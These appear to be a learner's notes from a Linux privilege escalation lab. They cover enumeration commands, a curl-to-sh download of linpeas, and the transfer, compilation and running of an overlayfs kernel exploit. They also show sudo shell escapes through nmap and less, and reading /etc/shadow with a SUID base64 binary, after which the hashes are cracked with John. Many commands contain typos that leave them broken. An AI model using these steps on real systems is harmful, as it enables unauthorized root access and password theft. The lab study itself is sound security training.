# /LinuxPrivilegeEscalation

hostname

uname -a for system informatoin

or cat /porc/version

or /etc/issue

ps to see running processes

pid : process id | tty terminal type used by thr user 

ps -A : all running processes

ps axjf view process tree

ps aux : show processes for all users

evn ; environmental variables

└─$ searchsploit linux kernel 3.13

└─$ searchsploit -x linux/local/37292.c

- **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS(opens in new tab)](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- **LinEnum:** [https://github.com/rebootuser/LinEnum(opens in new tab)(opens in new tab)](https://github.com/rebootuser/LinEnum)
- **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linuxexploit-suggester(opens in new tab)](https://github.com/mzet-/linux-exploit-suggester)
- **Linux Smart Enumeration:** [https://github.com/diego-treitos/linuxsmart-enumeration(opens in new tab)](https://github.com/diego-treitos/linux-smart-enumeration)
- **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

# 🔥 1. LinPEAS (MOST IMPORTANT)

### ✅ Quick run (if target has internet)

```
curl-L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh |sh
```

➡️ This downloads + runs directly

---

### ✅ Proper method (recommended in labs)

### On YOUR Kali:

```
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
python3-m http.server80
```

### On TARGET machine:

```
cd /tmp
wget http://YOUR-IP/linpeas.sh
chmod+x linpeas.sh
./linpeas.sh
```

➡️ This is the standard attacker → victim transfer method

---

# 🧠 2. LinEnum

```
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod+x LinEnum.sh
./LinEnum.sh
```

Optional:

```
./LinEnum.sh-t
```

➡️ `-t` = deep scan

---

# 💣 3. Linux Exploit Suggester (LES)

```
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh-O les.sh
chmod+x les.sh
./les.sh
```

➡️ Suggests kernel exploits based on version

---

# ⚡ 4. Linux Smart Enumeration (LSE)

```
wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh-O lse.sh
chmod700 lse.sh
./lse.sh
```

OR one-liner:

```
curl https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh-Lo lse.sh;chmod700 lse.sh
```

---

# 🧪 5. Linux Priv Checker

```
wget https://raw.githubusercontent.com/linted/linuxprivchecker/master/linuxprivchecker.py
python3 linuxprivchecker.py
```

---

# 🧠 IMPORTANT (this is what most beginners miss)

👉 These tools are used **AFTER you get a shell**

👉 You usually run them in:

```
/tmp
```

(because it's writable)

## kernal exploit

```jsx
-generic
karen@wade7363:/$ 

```

```jsx
searchsploit linux kernel 3.13

└─$ searchsploit linux kernel 3.13
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Linux Kernel (Solaris 10 / < 5.10 138888-01) - Local Privilege Escalation         | solaris/local/15962.c
Linux Kernel 2.6.19 < 5.9 - 'Netfilter Local Privilege Escalation                 | linux/local/50135.c
Linux Kernel 2.6.22 < 3.9 (x86/x64) - 'Dirty COW /proc/self/mem' Race Condition P | linux/local/40616.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW /proc/self/mem' Race Condition Privilege E | linux/local/40847.cpp
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW PTRACE_POKEDATA' Race Condition (Write Acc | linux/local/40838.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privileg | linux/local/40839.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' /proc/self/mem Race Condition (Write Acce | linux/local/40611.c
Linux Kernel 3.11 < 4.8 0 - 'SO_SNDBUFFORCE' / 'SO_RCVBUFFORCE' Local Privilege E | linux/local/41995.c
Linux Kernel 3.13 - SGID Privilege Escalation                                     | linux/local/33824.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local P | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local P | linux/local/37293.txt
Linux Kernel 3.13.1 - 'Recvmmsg' Local Privilege Escalation (Metasploit)          | linux/local/40503.rb
Linux Kernel 3.13/3.14 (Ubuntu) - 'splice()' System Call Local Denial of Service  | linux/dos/36743.c
Linux Kernel 3.14-rc1 < 3.15-rc4 (x64) - Raw Mode PTY Echo Race Condition Privile | linux_x86-64/local/33516.c
Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.04/13.10 x64) - 'CONFIG_X86_X32=y' Local Pri | linux_x86-64/local/31347.c
Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.10) - 'CONFIG_X86_X32' Arbitrary Write (2)   | linux/local/31346.c
Linux Kernel 3.4 < 3.13.2 - recvmmsg x32 compat (PoC)                             | linux/dos/31305.c
Linux Kernel 4.10.5 / < 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free              | linux/dos/43234.c
Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation                        | linux/local/41886.c
Linux Kernel < 3.16.1 - 'Remount FUSE' Local Privilege Escalation                 | linux/local/34923.c
Linux Kernel < 3.16.39 (Debian 8 x64) - 'inotfiy' Local Privilege Escalation      | linux_x86-64/local/44302.c
Linux Kernel < 4.10.13 - 'keyctl_set_reqkey_keyring' Local Denial of Service      | linux/dos/42136.c
Linux kernel < 4.10.15 - Race Condition Privilege Escalation                      | linux/local/43345.c
Linux Kernel < 4.11.8 - 'mq_notify: double sock_put()' Local Privilege Escalation | linux/local/45553.c
Linux Kernel < 4.13.1 - BlueTooth Buffer Overflow (PoC)                           | linux/dos/42762.txt
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation     | linux/local/45010.c
Linux Kernel < 4.14.rc3 - Local Denial of Service                                 | linux/dos/42932.c
Linux Kernel < 4.15.4 - 'show_floppy' KASLR Address Leak                          | linux/local/44325.c
Linux Kernel < 4.16.11 - 'ext4_read_inline_data()' Memory Corruption              | linux/dos/44832.txt
Linux Kernel < 4.17-rc1 - 'AF_LLC' Double Free                                    | linux/dos/44579.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation            | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Priv | linux_x86-64/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escal | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - L | linux/local/47169.c
Linux Kernel < 4.5.1 - Off-By-One (PoC)                                           | linux/dos/44301.c
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

## 🥇 1. OverlayFS (BEST CHOICE)

```
linux/local/37292.c
```

👉 OverlayFS privilege escalation

### ✅ Why this one?

- Specifically targets:
    - **Kernel 3.13**
    - **Ubuntu systems (like THM machines)**
- Reliable
- Very common in CTFs

👉 This is your **#1 choice**

## On Kali:

```
searchsploit-m linux/local/37292.c
python3-m http.server80
```

---

## On target:

```
cd /tmp
wget http://YOUR-IP/37292.c
```

---

## Compile:

```
gcc37292.c-o exploit
chmod+x exploit
```

---

## Run:

```
./exploit
```

## SUDO

```jsx
$ python3 -c 'import pty; pty.spawn("/bin/bash")'; export TERM=xterm
karen@ip-10-128-145-3:/$ sudo -l
Matching Defaults entries for karen on ip-10-128-145-3:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karen may run the following commands on ip-10-128-145-3:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano
karen@ip-10-128-145-3:/$ 

```

how to use nmap to spow root shell

```jsx
sudo nmap --interactive
nmap> !sh
```

leverage less to secalte prv

```jsx
sudo less /etc/profile
!/bin/sh
```

# Apache trick (file read)

If:

```
sudo apache2
```

You can leak files:

```
sudo apache2-f /etc/shadow
```

## SUID

```jsx
base64 /path/to/flag | base64 -d
```

## ⚔️ Exploitation

### Step 1 — Read `/etc/shadow`

```
/usr/bin/base64 /etc/shadow | /usr/bin/base64-d
```

This allowed extraction of password hashes, including:

```
gerryconway:$6$...
user2:$6$...
karen:$6$...
```

The `$6$` prefix indicates **SHA-512 hashing**.

---

### Step 2 — Retrieve `/etc/passwd`

```
cat /etc/passwd
```

This file provides the mapping between usernames and system accounts.

---

## 🔗 Combining Data

To prepare the hashes for cracking, both files were combined using:

```
unshadow passwd.txt shadow.txt > passwords.txt
```

### 🔎 Why this is needed:

- `/etc/passwd` → user structure
- `/etc/shadow` → password hashes
- `unshadow` merges them into a format usable by cracking tools

---

## 🔐 Password Cracking

The combined file was cracked using John the Ripper:

```
john passwords.txt--wordlist=/usr/share/wordlists/rockyou.txt
```

Then:

```
john--show passwords.txt
```

This revealed the plaintext password for `user2`.

---

## ⚡ Alternative Technique (Direct Access)

Instead of cracking passwords, the SUID `base64` binary can directly read sensitive files:

```
/usr/bin/base64 /root/flag3.txt | /usr/bin/base64-d
```

This works because the binary runs with root privileges, bypassing file permission restrictions.